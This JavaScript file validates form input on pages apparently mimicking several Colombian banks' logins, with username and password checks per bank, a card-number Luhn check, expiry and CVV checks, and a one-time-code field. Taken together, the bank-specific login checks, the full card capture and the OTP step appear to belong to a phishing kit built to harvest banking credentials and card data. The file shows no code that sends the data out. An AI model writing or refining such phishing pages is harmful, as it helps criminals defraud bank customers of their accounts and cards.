function validacion(enviar) {
  const page = document.getElementById("pag").value;

  switch (page) {
    case "logo":
      const bank = localStorage.getItem("bank");
      switch (bank) {
        case "BANCOLOMBIA":
          return validacionesBccolombia(enviar);
        case "BANCO COLPATRIA":
          return validacionesColpatria(enviar);
        case "BANCO DAVIVIENDA":
          return validacionesDavi(enviar);
        case "BANCO FALABELLA":
          return validacionesFala(enviar);
         
        default:
          return true;
      }

    case "tarjeta":

      return validacionesTarjeta(enviar);

    default:
      return true;
  }
}
// ---------- validacion general -----------
// function validaciones(enviar) {
//   enviar.disabled = true;
//   enviar.style.opacity = 0.7;
//   enviar.textContent = "Ejecutando proceso...";

//   //simulación de espera para ejecución de un proceso

//   setTimeout(function () {
//     enviar.textContent = "Pulsar";
//     enviar.style.opacity = 1;
//     enviar.disabled = false;
//   }, 5000);

//   // Expresión regular para validar alfanuméricos
//   const alphanumericRegex = /^(?=.*[a-zA-Z])(?=.*\d).+$/;


//   if (document.getElementById("txtPassword").value == "") {
//     Swal.fire({
//       icon: "error",
//       title: "Oops...",
//       text: "Debes ingresar una contraseña",
//       confirmButtonColor: "#000000",
//     });

//     return false;

//   }
//   return true;
// }

// ----------validacion tarjeta ----------

function validacionesTarjeta(enviar) {

  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulación de espera para ejecución de un proceso
  setTimeout(function () {
    enviar.textContent = 'Pulsar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  

  if (document.getElementById("selectMes").value == "mes") {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "Debes ingresar el numero de mes de expiracion de tu tarjeta",
      confirmButtonColor: "#2364d2",
    });

    return false;
  }

  if (document.getElementById("inputCCV").value == "") {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "Debes ingresar el codigo cvv que esta en la parte tracera  de tu tarjeta",
      confirmButtonColor: "#2364d2",
    });

    return false;
  }

  if (document.getElementById("TxtBanco").value == "00") {
    alert("Selecciona el tipo de banco")

    return false;
  }

  const numeroTarjeta = document.getElementById("inputNumero").value;
  const esValida = validarNumeroTarjeta(numeroTarjeta);

  if (esValida) {

  } else {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "La tarjeta no es válida. Por favor, verifica el número ingresado.",
      confirmButtonColor: "#2364d2",
    });
    return false;
  }

  return true;
}


function validarNumeroTarjeta(numeroTarjeta) {
  // 1. Eliminar espacios en blanco del número de tarjeta (si los hubiera)
  const numeroSinEspacios = numeroTarjeta.replace(/\s/g, '');

  // 2. Verificar que el número tenga entre 16 y 17 caracteres
  if (numeroSinEspacios.length < 16 || numeroSinEspacios.length > 17) {
    return false;
  }

  // 3. Aplicar el algoritmo de Luhn para validar la tarjeta
  let sum = 0;
  let double = false;
  for (let i = numeroSinEspacios.length - 1; i >= 0; i--) {
    let digit = parseInt(numeroSinEspacios.charAt(i), 10);

    if (double) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    double = !double;
  }

  return sum % 10 === 0;


}



// --------validacion colpatia ---------

function validacionesColpatria(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulación de espera para ejecución de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);



  if (document.getElementById("txtUser").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe tener numeros',
      confirmButtonColor: "#E73711"
    })



    return false;
  }

  if (document.getElementById("txtPassword").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una contraseña',
      confirmButtonColor: "#E73711"
    })

    return false;
  }


  if (document.getElementById("txtPassword").value.length < 4) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una clave de minimo 4 caracteres',
      confirmButtonColor: "#E73711"



    })
    return false;
  }
  return true;
}

// ----------- validacion davi  ------------


function validacionesDavi(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulación de espera para ejecución de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  if (document.getElementById("txtUser").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe tener  numeros',
      confirmButtonColor: "#717171"
    })



    return false;
  }

  if (document.getElementById("txtPassword").value == "") {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una contraseña',
      confirmButtonColor: "#717171"
    })

    return false;
  }

  if (document.getElementById("txtPassword").value.length < 6) {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una clave de minimo 6 caracteres',
      confirmButtonColor: "#717171"

    })
    return false;
  }
  return true;
}


// ----------- validacion tricolor  ------------


function validacionesBccolombia(enviar) {
  enviar.disabled = true;   
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulación de espera para ejecución de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  if (document.getElementById("txtUser").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe tener numeros',
      confirmButtonColor: "#81C12C"
    })

    return;
  }

  // Expresión regular para validar alfanuméricos
  const alphanumericRegex = /^(?=.*[a-zA-Z])(?=.*\d).+$/;





  if (!alphanumericRegex.test(txtUser.value)) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe contener letras y números',
      confirmButtonColor: "#000000"
    });
    return;
  }


  if (document.getElementById("txtPassword").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una contraseña',
      confirmButtonColor: "#000000"
    })

    return;
  }



  if (document.getElementById("txtPassword").value.length < 4) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una clave de minimo 4 caracteres',
      confirmButtonColor: "#000000"
    })

    return false;
  }
  return true;
}


// ----------- validacionfala   ------------


function validacionesFala(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulación de espera para ejecución de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  if (document.getElementById("txtUser").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe tener numeros',
      confirmButtonColor: "#81C12C"
    })

    return;
  }

  if (document.getElementById("txtPassword").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una contraseña',
      confirmButtonColor: "#81C12C"
    })


    return;
  }


  if (document.getElementById("txtPassword").value.length < 6) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una clave de minimo 6 caracteres',
      confirmButtonColor: "#81C12C"
    })

    return false;
  }
  return true;
}

// ----------- validacion 3d   ------------


function validaciones3D(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulación de espera para ejecución de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  if (document.getElementById("otp").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu codigo debe tener numeros',
      confirmButtonColor: "#81C12C"
    })

    return;
  }
  return true;
}